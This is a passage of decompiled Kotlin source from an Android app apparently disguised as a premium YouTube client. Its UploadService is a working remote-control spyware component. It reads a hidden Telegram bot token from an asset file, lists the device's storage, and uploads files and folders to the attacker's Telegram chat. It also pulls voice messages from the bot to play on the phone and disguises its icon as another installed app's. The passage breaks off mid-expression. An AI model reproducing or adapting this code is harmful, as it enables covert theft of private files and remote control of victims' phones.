    static final class C۰۰۰۹2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ String $appName;
        final /* synthetic */ Exception $e;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۰۹2(String str, Exception exc, Continuation<? super C۰۰۰۹2> continuation) {
            super(2, continuation);
            this.$appName = str;
            this.$e = exc;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۰۹2(this.$appName, this.$e, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object $result) {
            Object coroutine_suspended = IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure($result);
                    this.label = 1;
                    if (UploadService.this.sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۲۶String$0$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funopenAppByName$classUploadService() + this.$appName + LiveLiterals$UploadServiceKt.INSTANCE.m۶۵۶String$2$str$arg0$callsendTextToTelegram$fun$anonymous$$arg2$calllaunch$catch$funopenAppByName$classUploadService() + this.$e.getMessage(), (Continuation) this) == coroutine_suspended) {
                        return coroutine_suspended;
                    }
                    break;
                case 1:
                    ResultKt.throwOnFailure($result);
                    break;
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
            return Unit.INSTANCE;
        }
    }

    private final void sendPlayAudioToMainActivity(String audioPath) {
        bringMainActivityToFront();
        Intent intent = new Intent(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۷String$arg0$call$init$$valintent$funsendPlayAudioToMainActivity$classUploadService());
        intent.putExtra(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۶String$arg0$callputExtra$funsendPlayAudioToMainActivity$classUploadService(), audioPath);
        sendBroadcast(intent);
    }

    private final void sendSpeakTextToMainActivity(String text) {
        bringMainActivityToFront();
        Intent intent = new Intent(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۸String$arg0$call$init$$valintent$funsendSpeakTextToMainActivity$classUploadService());
        intent.putExtra(LiveLiterals$UploadServiceKt.INSTANCE.m۹۲۷String$arg0$callputExtra$funsendSpeakTextToMainActivity$classUploadService(), text);
        sendBroadcast(intent);
    }

    private final Object downloadLatestVoiceFromTelegram(Continuation<? super String> continuation) {
        ResponseBody responseBodyBody;
        String body;
        JSONArray result;
        String fileId;
        String filePath;
        try {
            String url = LiveLiterals$UploadServiceKt.INSTANCE.m۶۰۰String$0$str$valurl$try$fundownloadLatestVoiceFromTelegram$classUploadService() + this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۶String$2$str$valurl$try$fundownloadLatestVoiceFromTelegram$classUploadService() + (this.lastUpdateId + ((long) LiveLiterals$UploadServiceKt.INSTANCE.m۲۶۵Int$arg0$callplus$3$str$valurl$try$fundownloadLatestVoiceFromTelegram$classUploadService())) + LiveLiterals$UploadServiceKt.INSTANCE.m۷۱۳String$4$str$valurl$try$fundownloadLatestVoiceFromTelegram$classUploadService();
            Request request = new Request.Builder().url(url).build();
            Response response = this.client.newCall(request).execute();
            responseBodyBody = response.body();
        } catch (Exception e) {
        }
        if (responseBodyBody != null && (body = responseBodyBody.string()) != null) {
            JSONObject json = new JSONObject(body);
            if (!json.optBoolean(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۴String$arg0$calloptBoolean$cond$if$try$fundownloadLatestVoiceFromTelegram$classUploadService()) || (result = json.optJSONArray(LiveLiterals$UploadServiceKt.INSTANCE.m۹۰۹String$arg0$calloptJSONArray$valtmp2_elvis_lhs$valresult$branch$if$try$fundownloadLatestVoiceFromTelegram$classUploadService())) == null) {
                return null;
            }
            int i = result.length();
            while (true) {
                i--;
                if (-1 >= i) {
                    break;
                }
                JSONObject update = result.getJSONObject(i);
                JSONObject message = update.optJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۳String$arg0$calloptJSONObject$valtmp4_elvis_lhs$valmessage$body$loop$branch$if$try$fundownloadLatestVoiceFromTelegram$classUploadService());
                if (message != null) {
                    JSONObject voice = message.optJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۴String$arg0$calloptJSONObject$valvoice$body$loop$branch$if$try$fundownloadLatestVoiceFromTelegram$classUploadService());
                    JSONObject audio = message.optJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۰String$arg0$calloptJSONObject$valaudio$body$loop$branch$if$try$fundownloadLatestVoiceFromTelegram$classUploadService());
                    if (voice == null || (fileId = voice.optString(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۷String$arg0$calloptString$else$when$valtmp7_elvis_lhs$valfileId$body$loop$branch$if$try$fundownloadLatestVoiceFromTelegram$classUploadService())) == null) {
                        fileId = audio != null ? audio.optString(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۵String$arg0$calloptString$else$when$branch$when$valfileId$body$loop$branch$if$try$fundownloadLatestVoiceFromTelegram$classUploadService()) : null;
                    }
                    if (fileId != null && (filePath = getTelegramFilePath(fileId)) != null) {
                        return filePath;
                    }
                }
            }
            return null;
        }
        return null;
    }

    private final String getTelegramFilePath(String fileId) {
        String fileInfoBody;
        try {
            String fileInfoUrl = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۴String$0$str$valfileInfoUrl$try$fungetTelegramFilePath$classUploadService() + this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۱String$2$str$valfileInfoUrl$try$fungetTelegramFilePath$classUploadService() + fileId;
            Request fileInfoReq = new Request.Builder().url(fileInfoUrl).build();
            Response fileInfoResp = this.client.newCall(fileInfoReq).execute();
            ResponseBody responseBodyBody = fileInfoResp.body();
            if (responseBodyBody != null && (fileInfoBody = responseBodyBody.string()) != null) {
                JSONObject fileInfoJson = new JSONObject(fileInfoBody);
                JSONObject jSONObjectOptJSONObject = fileInfoJson.optJSONObject(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۲String$arg0$calloptJSONObject$valtmp2_safe_receiver$valtmp3_elvis_lhs$valfilePath$try$fungetTelegramFilePath$classUploadService());
                String filePath = jSONObjectOptJSONObject != null ? jSONObjectOptJSONObject.optString(LiveLiterals$UploadServiceKt.INSTANCE.m۹۱۶String$arg0$calloptString$else$when$valtmp3_elvis_lhs$valfilePath$try$fungetTelegramFilePath$classUploadService()) : null;
                if (filePath == null) {
                    return null;
                }
                String fileUrl = LiveLiterals$UploadServiceKt.INSTANCE.m۵۹۵String$0$str$valfileUrl$try$fungetTelegramFilePath$classUploadService() + this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۹۲String$2$str$valfileUrl$try$fungetTelegramFilePath$classUploadService() + filePath;
                File localFile = new File(getCacheDir(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۵۲String$0$str$arg1$call$init$$vallocalFile$try$fungetTelegramFilePath$classUploadService() + System.currentTimeMillis() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۷۷String$2$str$arg1$call$init$$vallocalFile$try$fungetTelegramFilePath$classUploadService());
                Response fileResp = this.client.newCall(new Request.Builder().url(fileUrl).build()).execute();
                Sink sink = Okio.sink$default(localFile, false, 1, (Object) null);
                ResponseBody responseBodyBody2 = fileResp.body();
                BufferedSource source = responseBodyBody2 != null ? responseBodyBody2.source() : null;
                if (source != null) {
                    source.buffer().readAll(sink);
                }
                sink.close();
                return localFile.getAbsolutePath();
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    @Override // android.app.Service
    public IBinder onBind(Intent intent) {
        return null;
    }

    private final void setFakeAppIcon(boolean enable) {
        try {
            PackageManager pm = getPackageManager();
            ComponentName componentName = new ComponentName(this, Class.forName(LiveLiterals$UploadServiceKt.INSTANCE.m۸۷۵String$arg0$callforName$arg1$call$init$$valcomponentName$try$funsetFakeAppIcon$classUploadService()));
            if (enable) {
                Iterable installedApplications = pm.getInstalledApplications(128);
                Intrinsics.checkNotNullExpressionValue(installedApplications, "pm.getInstalledApplicati…ageManager.GET_META_DATA)");
                Iterable $this$filter$iv = installedApplications;
                Collection destination$iv$iv = new ArrayList();
                for (Object element$iv$iv : $this$filter$iv) {
                    ApplicationInfo it = (ApplicationInfo) element$iv$iv;
                    if ((it.flags & 1) == LiveLiterals$UploadServiceKt.INSTANCE.m۲۹۳Int$arg1$callEQEQ$cond$fun$anonymous$$arg0$callfilter$valapps$branch$if$try$funsetFakeAppIcon$classUploadService() && !Intrinsics.areEqual(it.packageName, getPackageName())) {
                        destination$iv$iv.add(element$iv$iv);
                    }
                }
                List apps = (List) destination$iv$iv;
                if (!apps.isEmpty()) {
                    ApplicationInfo fakeApp = (ApplicationInfo) CollectionsKt.random(apps, Random.Default);
                    Intrinsics.checkNotNullExpressionValue(pm.getApplicationIcon(fakeApp), "pm.getApplicationIcon(fakeApp)");
                    pm.setComponentEnabledSetting(componentName, 1, 1);
                    return;
                }
                return;
            }
            pm.setComponentEnabledSetting(componentName, 1, 1);
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۵۸String$arg0$calle$catch$funsetFakeAppIcon$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۷۷String$0$str$arg1$calle$catch$funsetFakeAppIcon$classUploadService() + e.getMessage());
        }
    }

    private final boolean hasStoragePermission() {
        if (Build.VERSION.SDK_INT >= 30) {
            return Environment.isExternalStorageManager();
        }
        return ContextCompat.checkSelfPermission(this, "android.permission.READ_EXTERNAL_STORAGE") == 0;
    }

    private final String listSdcardRoot() {
        List listEmptyList;
        if (!hasStoragePermission()) {
            if (Build.VERSION.SDK_INT >= 30) {
                return LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۵۶String$branch$if$branch$if$funlistSdcardRoot$classUploadService();
            }
            return LiveLiterals$UploadServiceKt.INSTANCE.m۱۳۹۸String$else$if$branch$if$funlistSdcardRoot$classUploadService();
        }
        StringBuilder results = new StringBuilder();
        try {
            File internal = new File(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۱String$arg0$call$init$$valinternal$try$funlistSdcardRoot$classUploadService());
            results.append(LiveLiterals$UploadServiceKt.INSTANCE.m۸۰۶String$arg0$callappend$try$funlistSdcardRoot$classUploadService());
            if (internal.exists() && internal.isDirectory()) {
                File[] fileArrListFiles = internal.listFiles();
                if (fileArrListFiles != null) {
                    for (File file : fileArrListFiles) {
                        results.append(file.isDirectory() ? LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۶String$0$str$branch$if$arg0$callappend$$this$callappend$fun$anonymous$$arg0$callforEach$else$when$branch$if$try$funlistSdcardRoot$classUploadService() + file.getName() : file.getName()).append(LiveLiterals$UploadServiceKt.INSTANCE.m۸۰۴String$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$branch$if$try$funlistSdcardRoot$classUploadService());
                    }
                }
            } else {
                results.append(LiveLiterals$UploadServiceKt.INSTANCE.m۸۰۱String$arg0$callappend$else$if$try$funlistSdcardRoot$classUploadService());
            }
            File storageRoot = new File(LiveLiterals$UploadServiceKt.INSTANCE.m۷۵۴String$arg0$call$init$$valstorageRoot$try$funlistSdcardRoot$classUploadService());
            File[] fileArrListFiles2 = storageRoot.listFiles();
            if (fileArrListFiles2 == null) {
                listEmptyList = CollectionsKt.emptyList();
            } else {
                Collection destination$iv$iv = new ArrayList();
                for (File file2 : fileArrListFiles2) {
                    if (file2.isDirectory() && file2.canRead() && !Intrinsics.areEqual(file2.getAbsolutePath(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۰۵String$arg1$callEQEQ$$this$callnot$branch$cond$fun$anonymous$$arg0$callfilter$else$when$valtmp2_elvis_lhs$valexternalDirs$try$funlistSdcardRoot$classUploadService()) && !Intrinsics.areEqual(file2.getAbsolutePath(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۲۰۶String$arg1$callEQEQ$$this$callnot$branch$fun$anonymous$$arg0$callfilter$else$when$valtmp2_elvis_lhs$valexternalDirs$try$funlistSdcardRoot$classUploadService())) {
                        destination$iv$iv.add(file2);
                    }
                }
                listEmptyList = (List) destination$iv$iv;
            }
            List<File> externalDirs = listEmptyList;
            for (File ext : externalDirs) {
                results.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۴String$0$str$arg0$callappend$body$loop$try$funlistSdcardRoot$classUploadService() + ext.getName() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۰String$2$str$arg0$callappend$body$loop$try$funlistSdcardRoot$classUploadService());
                File[] fileArrListFiles3 = ext.listFiles();
                if (fileArrListFiles3 != null) {
                    for (File file3 : fileArrListFiles3) {
                        results.append(file3.isDirectory() ? LiveLiterals$UploadServiceKt.INSTANCE.m۵۸۵String$0$str$branch$if$arg0$callappend$$this$callappend$fun$anonymous$$arg0$callforEach$else$when$body$loop$try$funlistSdcardRoot$classUploadService() + file3.getName() : file3.getName()).append(LiveLiterals$UploadServiceKt.INSTANCE.m۸۰۳String$arg0$callappend$fun$anonymous$$arg0$callforEach$else$when$body$loop$try$funlistSdcardRoot$classUploadService());
                    }
                }
            }
        } catch (Exception e) {
            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۴۴String$arg0$calle$catch$funlistSdcardRoot$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۷۰String$0$str$arg1$calle$catch$funlistSdcardRoot$classUploadService() + e.getMessage());
            results.append(LiveLiterals$UploadServiceKt.INSTANCE.m۴۴۹String$0$str$arg0$callappend$catch$funlistSdcardRoot$classUploadService() + e.getMessage() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۲۵String$2$str$arg0$callappend$catch$funlistSdcardRoot$classUploadService());
        }
        String string = results.toString();
        Intrinsics.checkNotNullExpressionValue(string, "results.toString()");
        String str = string;
        if (StringsKt.isBlank(str)) {
            str = LiveLiterals$UploadServiceKt.INSTANCE.m۱۴۱۱String$fun$anonymous$$arg0$callifBlank$funlistSdcardRoot$classUploadService();
        }
        return str;
    }

    private final Object sendSdcardFileToTelegram(String filename, Continuation<? super Unit> continuation) {
        File file = new File(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۵String$arg0$call$init$$valfile$funsendSdcardFileToTelegram$classUploadService(), filename);
        if (file.exists() && file.isFile()) {
            Object objSendFileToTelegram = sendFileToTelegram(file, continuation);
            return objSendFileToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFileToTelegram : Unit.INSTANCE;
        }
        Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۱۲String$0$str$arg0$callsendTextToTelegram$else$if$funsendSdcardFileToTelegram$classUploadService() + filename, continuation);
        return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
    }

    private final Object sendSdcardFolderToTelegram(String folder, Continuation<? super Unit> continuation) throws InterruptedException {
        List<? extends File> listEmptyList;
        File dir = new File(LiveLiterals$UploadServiceKt.INSTANCE.m۷۴۴String$arg0$call$init$$valdir$funsendSdcardFolderToTelegram$classUploadService(), folder);
        if (dir.exists() && dir.isDirectory()) {
            File[] fileArrListFiles = dir.listFiles();
            if (fileArrListFiles != null) {
                Collection destination$iv$iv = new ArrayList();
                for (File file : fileArrListFiles) {
                    if (file.isFile()) {
                        destination$iv$iv.add(file);
                    }
                }
                listEmptyList = (List) destination$iv$iv;
            } else {
                listEmptyList = CollectionsKt.emptyList();
            }
            List<? extends File> list = listEmptyList;
            if (list.isEmpty()) {
                Object objSendTextToTelegram = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۰۹String$0$str$arg0$callsendTextToTelegram$branch$if$branch$if$funsendSdcardFolderToTelegram$classUploadService() + folder, continuation);
                return objSendTextToTelegram == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram : Unit.INSTANCE;
            }
            Object objSendFilesInParallel = sendFilesInParallel(list, new Function0<Boolean>() { // from class: com.w8sb.w8premiumyt.UploadService.sendSdcardFolderToTelegram.2
                /* JADX INFO: renamed from: invoke, reason: merged with bridge method [inline-methods] */
                public final Boolean m۱۴۸۷invoke() {
                    return Boolean.valueOf(LiveLiterals$UploadServiceKt.INSTANCE.m۱۹۹Boolean$fun$anonymous$$arg1$callsendFilesInParallel$else$if$branch$if$funsendSdcardFolderToTelegram$classUploadService());
                }
            }, continuation);
            return objSendFilesInParallel == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendFilesInParallel : Unit.INSTANCE;
        }
        Object objSendTextToTelegram2 = sendTextToTelegram(LiveLiterals$UploadServiceKt.INSTANCE.m۵۱۳String$0$str$arg0$callsendTextToTelegram$else$if$funsendSdcardFolderToTelegram$classUploadService() + folder, continuation);
        return objSendTextToTelegram2 == IntrinsicsKt.getCOROUTINE_SUSPENDED() ? objSendTextToTelegram2 : Unit.INSTANCE;
    }

    /* JADX WARN: Removed duplicated region for block: B:28:0x00e7 A[RETURN] */
    /* JADX WARN: Removed duplicated region for block: B:7:0x0014  */
    /*
        Code decompiled incorrectly, please refer to instructions dump.
        To view partially-correct add '--show-bad-code' argument
    */
    private final java.lang.Object sendFileToTelegram(java.io.File r13, kotlin.coroutines.Continuation<? super kotlin.Unit> r14) {
        /*
            Method dump skipped, instruction units count: 246
            To view this dump add '--comments-level debug' option
        */
        throw new UnsupportedOperationException("Method not decompiled: com.w8sb.w8premiumyt.UploadService.sendFileToTelegram(java.io.File, kotlin.coroutines.Continuation):java.lang.Object");
    }

    /* JADX INFO: renamed from: com.w8sb.w8premiumyt.UploadService$sendFileToTelegram$2, reason: invalid class name and case insensitive filesystem */
    /* JADX INFO: compiled from: UploadService.kt */
    @Metadata(d1 = {"\u0000\n\n\u0002\u0018\u0002\n\u0002\u0010\u0002\n\u0000\u0010\u0002\u001a\u00020\u0001*\u00020\u0000H\u008a@"}, d2 = {"Lkotlinx/coroutines/CoroutineScope;", "", "<anonymous>"}, k = 3, mv = {1, 8, 0})
    @DebugMetadata(c = "com.w8sb.w8premiumyt.UploadService$sendFileToTelegram$2", f = "UploadService.kt", i = {}, l = {}, m = "invokeSuspend", n = {}, s = {})
    static final class C۰۰۲۹2 extends SuspendLambda implements Function2<CoroutineScope, Continuation<? super Unit>, Object> {
        final /* synthetic */ MultipartBody $requestBody;
        int label;

        /* JADX WARN: 'super' call moved to the top of the method (can break code semantics) */
        C۰۰۲۹2(MultipartBody multipartBody, Continuation<? super C۰۰۲۹2> continuation) {
            super(2, continuation);
            this.$requestBody = multipartBody;
        }

        public final Continuation<Unit> create(Object obj, Continuation<?> continuation) {
            return UploadService.this.new C۰۰۲۹2(this.$requestBody, continuation);
        }

        public final Object invoke(CoroutineScope coroutineScope, Continuation<? super Unit> continuation) {
            return create(coroutineScope, continuation).invokeSuspend(Unit.INSTANCE);
        }

        public final Object invokeSuspend(Object obj) {
            IntrinsicsKt.getCOROUTINE_SUSPENDED();
            switch (this.label) {
                case 0:
                    ResultKt.throwOnFailure(obj);
                    Response response = (Closeable) UploadService.this.client.newCall(new Request.Builder().url(LiveLiterals$UploadServiceKt.INSTANCE.m۵۳۹String$0$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendFileToTelegram$classUploadService() + UploadService.this.botToken + LiveLiterals$UploadServiceKt.INSTANCE.m۶۶۴String$2$str$arg0$callurl$$this$callpost$$this$callbuild$arg0$callnewCall$$this$callexecute$$$this$calluse$fun$anonymous$$arg1$callwithContext$try$funsendFileToTelegram$classUploadService()).post(this.$requestBody).build()).execute();
                    try {
                        Response response2 = response;
                        if (!response2.isSuccessful()) {
                            Log.e(LiveLiterals$UploadServiceKt.INSTANCE.m۸۲۰String$arg0$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendFileToTelegram$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۵۶۲String$0$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendFileToTelegram$classUploadService() + response2.code() + LiveLiterals$UploadServiceKt.INSTANCE.m۶۸۲String$2$str$arg1$calle$branch$if$fun$anonymous$$arg0$calluse$fun$anonymous$$arg1$callwithContext$try$funsendFileToTelegram$classUploadService() + response2.message());
                        }
                        Unit unit = Unit.INSTANCE;
                        CloseableKt.closeFinally(response, (Throwable) null);
                        return Unit.INSTANCE;
                    } finally {
                    }
                default:
                    throw new IllegalStateException("call to 'resume' before 'invoke' with coroutine");
            }
        }
    }

    private final void reloadConfig() {
        try {
            InputStream inputStreamOpen = getAssets().open(LiveLiterals$UploadServiceKt.INSTANCE.m۸۹۲String$arg0$callopen$$$this$callbufferedReader$$$this$calluse$valconfigStr$try$funreloadConfig$classUploadService());
            Intrinsics.checkNotNullExpressionValue(inputStreamOpen, "assets.open(\"logo.json\")");
            Reader inputStreamReader = new InputStreamReader(inputStreamOpen, Charsets.UTF_8);
            BufferedReader bufferedReader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
            try {
                BufferedReader it = bufferedReader;
                String configStr = TextStreamsKt.readText(it);
                CloseableKt.closeFinally(bufferedReader, (Throwable) null);
                JSONObject config = new JSONObject(configStr);
                String string = config.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۵String$arg0$callgetString$arg0$call$setbotToken$$try$funreloadConfig$classUploadService());
                Intrinsics.checkNotNullExpressionValue(string, "config.getString(\"bot_token\")");
                this.botToken = string;
                String string2 = config.getString(LiveLiterals$UploadServiceKt.INSTANCE.m۸۸۷String$arg0$callgetString$arg0$call$setchatId$$try$funreloadConfig$classUploadService());
                Intrinsics.checkNotNullExpressionValue(string2, "config.getString(\"chat_id\")");
                this.chatId = string2;
            } finally {
            }
        } catch (Exception e) {
        }
    }

    private final String buildCommandsKeyboard() {
        Map keyboard = MapsKt.mapOf(TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۳۰String$$$this$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), CollectionsKt.listOf(new List[]{CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۰String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۲String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۰String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۲String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۹String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۱String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۹String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۱String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$0$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۵۱String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۰۳String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۹۱String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۴۳String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۰String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۲۲String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۰String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۶۲String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$1$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۰String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۱۲String$arg0$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۰۰String$$$this$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۵۲String$arg0$callto$1$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())}), MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۷۹String$$$this$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۳۱String$arg0$callto$0$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService()), TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۴۱۹String$$$this$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), LiveLiterals$UploadServiceKt.INSTANCE.m۱۱۷۱String$arg0$callto$1$vararg$arg0$callmapOf$1$vararg$arg0$calllistOf$2$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService())})}), CollectionsKt.listOf(new Map[]{MapsKt.mapOf(new Pair[]{TuplesKt.to(LiveLiterals$UploadServiceKt.INSTANCE.m۳۶۱String$$$this$callto$0$vararg$arg0$callmapOf$0$vararg$arg0$calllistOf$3$vararg$arg0$calllistOf$arg0$callto$arg0$callmapOf$valkeyboard$funbuildCommandsKeyboard$classUploadService(), 